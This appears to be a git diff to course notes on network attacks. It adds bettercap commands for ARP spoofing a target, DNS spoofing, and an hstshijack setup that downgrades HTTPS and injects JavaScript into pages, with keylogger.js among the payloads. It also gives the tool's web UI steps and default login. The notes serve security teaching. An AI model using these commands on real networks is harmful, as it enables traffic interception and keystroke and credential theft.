@@ -623,7 +623,7 @@ Let's look at an example output of DNS Spoofing using bettercap:
   Use the following commands in bettercap terminal:
 
   ```bash
-  net.probe on; net.sniff on; arp.spoof.fullduplex true; arp.spoof.targets <target_ip>; arp.spoof on; set dns.spoof.domains linkedin.com; dns.spoof on;
+  net.probe on; net.sniff on; arp.spoof.targets <target_ip>; arp.spoof.fullduplex true; arp.spoof on; set dns.spoof.domains linkedin.com; dns.spoof on;
   ```
 
   ![](../imgs/dns-spoof2.png)
@@ -633,3 +633,92 @@ Let's look at an example output of DNS Spoofing using bettercap:
   ![](../imgs/dns-spoof3.png)
   ![](../imgs/dns-spoof4.png)
 
+### Injecting JavaScript Code
+
+- Once, we have become the man in the middle, we can also modify the components of the web page, that is being loaded on browser of the target machine. We can insert any piece of code we want, and the browser will execute it. 
+
+- HTML is only responsible for rendering only the elements that we see on the web page. It doesn't really allow us to do much. But, modern browsers can execute Javascript code.
+
+- So, before starting `bettercap`, you must have the javascript code that you want to inject ready. For this example, we will use a simple javascript code:
+
+  ```javascript
+  alert("Javascript Injection Successful!");
+  ```
+  
+  Save it as `inject.js` file.
+
+- Now go to the `hstshijack` caplet directory `/usr/local/share/bettercap/caplets/hstshijack/` open it in the editor and edit `set hstshijack.payloads` parameter to include the path of your `inject.js` file as shown below:
+
+  ```bash
+  set hstshijack.payloads *:/path/to/your/inject.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js
+  ```
+  
+- Now, Run `bettercap` and use the `hstshijack` caplet as shown in the previous section.
+
+  ```bash
+  bettercap -iface <interface_name>
+  net.probe on; net.sniff on;
+  net.show
+  arp.spoof.fullduplex true; arp.spoof.targets <target_ip>; arp.spoof on;
+  hstshijack/hstshijack
+  set dns.spoof.all true; set dns.spoof.domains www.targetsite.com,*.targetsite.com; dns.spoof on;
+  ```
+  
+  This will cause the target website to load in HTTP instead of HTTPS, allowing `bettercap` to inject the javascript code into the web page.
+
+#### Bettercap UI Mode
+
+- In order to use the UI Interface of bettercap, you need to start bettercap with the `-eval "http-ui"` option as shown below:
+
+  ```bash
+  bettercap -iface <interface_name> -eval "http-ui"
+  ```
+  
+  You can also do it as:
+
+  ```bash
+  bettercap -iface <interface_name>
+  http-ui
+  ```
+  
+- This will start the bettercap UI on `http://127.0.0.1:80` on the Kali machine. You can access it using any web browser.
+
+- For the default username and password is:
+
+  ```secret 
+  username: user
+  password: pass
+  ```
+  
+- If you are using your own custom Kali machine, you have to install the UI using the command:
+
+  ```bash
+  ui.update
+  ```
+  
+- On the UI, Click on `LAN` button at the top Navigation bar. This will show you all the devices on the network.
+
+- Click on the play button to start `net.probe` to discover all the devices on the network, and than Click on the play button that appears again to start `net.recon` to gather more information about the devices.
+
+- Now, Click on the IP of the target machine, a drop down appears. In the drop down you get the following options:
+
+  - Copy
+  - Scan Ports
+  - Add to `arp.spoof.targets`
+
+- If you click on `Add to arp.spoof.targets`, the target IP will be added to the `arp.spoof.targets` parameter. Now, you will see more options including:
+
+  - fullduplex spoofing
+  - spoof local connections
+  - ban mode
+  - Start `arp.spoof`
+
+- Enable `fullduplex spoofing` and Click on `Start arp.spoof` to start the ARP Spoofing attack.
+
+- Now, to use the `hstshijack` caplet, Click on the `CAPLETS` button on the top navigation bar. This will show you all the available caplets.
+
+- Select the caplet `hstshijack/hstshijack` from the list, that we want to use, now we also havve the option to directly edit the caplet here itself.
+
+- Click on play button to load the caplet. This will start the `hstshijack` module.
+
+- From the `advanced` on the top navigation bar, We can look for the commands, we want to run, we can directly click on them and execute them.
